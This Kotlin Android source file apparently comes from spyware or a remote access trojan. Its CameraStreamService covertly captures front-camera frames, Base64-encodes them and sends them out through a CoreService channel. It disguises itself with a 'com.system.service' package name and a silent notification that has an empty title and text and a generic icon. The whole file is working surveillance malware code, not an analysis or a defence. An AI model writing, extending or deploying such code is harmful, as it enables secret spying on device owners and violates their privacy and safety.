package com.system.service.monitors

import android.app.*
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Base64
import com.system.service.core.CoreService
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

class CameraStreamService : Service() {

    companion object {
        var isRunning = false
        private const val CHANNEL_ID = "cam_stream"
        private const val NOTIF_ID   = 11
    }

    private val streaming   = AtomicBoolean(false)
    private val lastSentAt  = AtomicLong(0L)
    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    // LAG FIX: minimum 500ms interval
    private var intervalMs: Long = 1500L

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
        createChannel()
        startForeground(NOTIF_ID, buildNotif())
        // LAG FIX: minimum 500ms, default 1500ms
        intervalMs = (intent?.getLongExtra("interval", 1500L) ?: 1500L).coerceAtLeast(500L)
        isRunning = true
        streaming.set(true)
        startCamera()
        return START_STICKY
    }

    private fun startCamera() {
        thread = HandlerThread("CamStream", Process.THREAD_PRIORITY_DISPLAY).apply { start() }
        handler = Handler(thread!!.looper)

        val mgr = getSystemService(CAMERA_SERVICE) as CameraManager

        val camId = mgr.cameraIdList.firstOrNull { id ->
            mgr.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
        } ?: mgr.cameraIdList.firstOrNull() ?: return

        val map = mgr.getCameraCharacteristics(camId)
            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return

        val sizes = map.getOutputSizes(ImageFormat.JPEG)
        // LAG FIX: pick smallest size for speed
        val size  = sizes.minByOrNull { it.width * it.height } ?: return

        // LAG FIX: 3 buffers to prevent blocking on slow networks
        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 3)
        imageReader!!.setOnImageAvailableListener({ reader ->
            val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val now = System.currentTimeMillis()
                // LAG FIX: Drop frames faster than interval
                if (now - lastSentAt.get() < intervalMs) { img.close(); return@setOnImageAvailableListener }
                lastSentAt.set(now)

                val buf   = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                img.close()

                // LAG FIX: Send on background thread, not main thread
                CoreService.instance?.sendData("camera_frame", JSONObject().apply {
                    put("frame", Base64.encodeToString(bytes, Base64.NO_WRAP))
                    put("w", size.width); put("h", size.height)
                })
            } catch (_: Exception) { try { img.close() } catch (_: Exception) {} }
        }, handler)

        try {
            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    cameraDevice = cam
                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                        addTarget(imageReader!!.surface)
                        // LAG FIX: Reduce AF/AE overhead
                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                    }.build()
                    cam.createCaptureSession(listOf(imageReader!!.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                if (!streaming.get()) { s.close(); return }
                                session = s
                                try { s.setRepeatingRequest(req, null, handler) } catch (_: Exception) {}
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { stopSelf() }
                        }, handler)
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close(); cameraDevice = null }
                override fun onError(cam: CameraDevice, e: Int) { cam.close(); cameraDevice = null; stopSelf() }
            }, handler)
        } catch (_: SecurityException) { stopSelf() }
    }

    private fun stopStream() {
        streaming.set(false); isRunning = false
        try { session?.stopRepeating() }  catch (_: Exception) {}
        try { session?.close() }          catch (_: Exception) {}
        try { cameraDevice?.close() }     catch (_: Exception) {}
        try { imageReader?.close() }      catch (_: Exception) {}
        thread?.quitSafely()
    }

    private fun createChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Camera", NotificationManager.IMPORTANCE_NONE)
            .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
        .setContentTitle("").setContentText("")
        .setSmallIcon(android.R.drawable.screen_background_dark).build()

    override fun onDestroy() { stopStream(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
